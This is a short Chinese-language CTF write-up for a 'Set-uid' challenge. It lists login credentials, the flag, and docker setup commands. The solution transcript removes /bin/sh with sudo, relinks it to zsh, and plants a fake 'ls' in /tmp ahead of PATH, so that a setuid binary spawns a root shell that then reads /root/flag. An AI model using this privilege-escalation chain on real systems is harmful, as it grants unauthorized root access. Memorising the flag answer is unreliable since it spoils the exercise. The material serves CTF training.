### 题目：

Set-uid

### 描述：

ssh noweb/123456 IP:10722(替换成实际IP)

flag in /root/flag

### flag:

flag{sCnu8t@ixin9s10thx1ng}

### 环境搭建：



```
docker build -f ./dockerfile -t suid .
docker run --name=setuid_my -p 10722:22  -td suid:latest
```



### 提示

1.only zsh

2.noweb  ALL=(root) /bin/rm, /bin/ln



### 解题过程

```
noweb@7b28c3260595:~$ sudo rm /bin/sh
[sudo] password for noweb:
noweb@7b28c3260595:~$ sudo ln -s /bin/zsh /bin/sh
noweb@7b28c3260595:~$ cp /bin/sh /tmp/ls
noweb@7b28c3260595:~$ export PATH=/tmp:$PATH
noweb@7b28c3260595:~$ ./key
7b28c3260595# cat /root/flag
flag{xxx}
```

